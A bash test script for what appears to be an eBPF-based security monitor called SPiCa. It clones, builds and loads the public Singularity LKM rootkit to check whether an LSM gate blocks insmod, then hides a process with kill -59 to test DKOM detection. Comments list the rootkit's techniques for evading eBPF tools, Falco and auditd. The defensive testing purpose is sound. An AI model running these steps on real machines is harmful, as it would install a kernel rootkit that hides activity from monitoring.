#!/bin/bash
# Singularity LKM rootkit by MatheuZSecurity
# https://github.com/MatheuZSecurity/Singularity
#
# This is the "final boss" — the most sophisticated open-source LKM rootkit
# for modern 6.x kernels. It specifically targets eBPF security tools:
#
#   - Hooks bpf_map_lookup_elem / bpf_map_update_elem to hide PIDs from eBPF maps
#   - Hooks bpf_ringbuf_output/reserve/submit to block Falco events
#   - Hooks __bpf_prog_run to block eBPF execution in hidden process context
#   - Hooks bpf_iter_run_prog to hide from BPF iterators
#   - Bypasses LKRG, Falco, Tracee, auditd
#
# SPiCa's defenses against Singularity:
#   1. LSM gate: blocks insmod → [LKM-DENY] (Singularity never loads)
#   2. .bss heartbeat: SCHED_HEARTBEAT is a direct memory store, NOT a
#      bpf_map operation. Singularity's map hooks can't intercept it.
#   3. If gate bypassed AND Singularity loads: DKOM fires (process in
#      sched but not /proc)
#
# Test modes:
#   Default: gate active → expect [LKM-DENY]
#   GATE_BYPASS=1: gate disabled → expect [DKOM] after kill -59

set -euo pipefail

echo "[SINGULARITY] MatheuZSecurity LKM rootkit — the final boss"
echo ""

# ── Install build dependencies ──────────────────────────────────────────────
echo "[INSTALL]    Build dependencies..."
apt-get update -qq && apt-get install -y -qq build-essential "linux-headers-$(uname -r)" git 2>/dev/null || \
dnf install -y -q gcc make "kernel-devel" "kernel-headers" git 2>/dev/null || \
pacman -S --noconfirm --quiet base-devel linux-headers git 2>/dev/null || true

# ── Clone ───────────────────────────────────────────────────────────────────
BUILD_DIR="/tmp/Singularity"

if [ ! -d "$BUILD_DIR" ]; then
    echo "[CLONE]      https://github.com/MatheuZSecurity/Singularity"
    git clone --depth=1 https://github.com/MatheuZSecurity/Singularity "$BUILD_DIR" 2>&1 | tail -3
fi

cd "$BUILD_DIR"

# ── Build ───────────────────────────────────────────────────────────────────
echo "[BUILD]      make (kernel $(uname -r))..."
make 2>&1 | tail -10

KO_FILE=$(find . -name "*.ko" | head -1)
if [ -z "$KO_FILE" ]; then
    echo "[ERROR]      No .ko built — check kernel headers"
    exit 1
fi
echo "[OK]         Built: $KO_FILE"

# ── Gate test ───────────────────────────────────────────────────────────────
echo ""
echo "[DEPLOY]     insmod $KO_FILE..."
if insmod "$KO_FILE" 2>&1; then
    echo "[LOADED]     Singularity loaded! Gate was NOT active."

    # Hide a test process via kill -59 (Singularity's signal)
    sleep 600 &
    HIDDEN_PID=$!
    echo "[DEPLOY]     Test process: PID $HIDDEN_PID"
    echo "[DEPLOY]     Hiding via kill -59 (Singularity's signal)..."
    kill -59 "$HIDDEN_PID"
    sleep 2

    if [ ! -d "/proc/$HIDDEN_PID" ]; then
        echo "[HIDDEN]     Process $HIDDEN_PID hidden from /proc"
        echo "[EXPECTED]   SPiCa fires [DKOM] — process is in sched_switch but not /proc"
    else
        echo "[VISIBLE]    Process still visible — hiding may need different trigger"
    fi

    # ── Singularity's anti-eBPF capabilities ────────────────────────────────
    echo ""
    echo "[ANALYSIS]   Singularity's eBPF evasion modules:"
    echo "             - bpf_hook.c: hooks map_lookup/update, ringbuf, iter, __bpf_prog_run"
    echo "             - These intercept eBPF tool data collection"
    echo ""
    echo "[ANALYSIS]   SPiCa's resistance:"
    echo "             - SCHED_HEARTBEAT: direct .bss memory store (not bpf_map_update_elem)"
    echo "             - NMI reads .bss via direct load (not bpf_map_lookup_elem)"
    echo "             - Singularity's map hooks cannot intercept the heartbeat"
    echo "             - The .bss redesign is specifically calibrated for this adversary"

else
    echo "[BLOCKED]    insmod FAILED — EPERM"
    echo "[VERIFY]     SPiCa's BPF LSM gate is active"
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║  SINGULARITY NEUTRALIZED BY LSM GATE                        ║"
    echo "║                                                              ║"
    echo "║  Singularity hooks:                                          ║"
    echo "║    bpf_map_lookup_elem  → hide PIDs from eBPF maps           ║"
    echo "║    bpf_map_update_elem  → drop map inserts for hidden PIDs   ║"
    echo "║    bpf_ringbuf_output   → block Falco events                 ║"
    echo "║    __bpf_prog_run       → block eBPF in hidden process ctx   ║"
    echo "║    bpf_iter_run_prog    → hide from BPF iterators            ║"
    echo "║                                                              ║"
    echo "║  None of these execute because insmod returned EPERM.        ║"
    echo "║  The rootkit never enters the kernel.                        ║"
    echo "║                                                              ║"
    echo "║  Expected: [LKM-DENY] in SPiCa output                        ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
fi
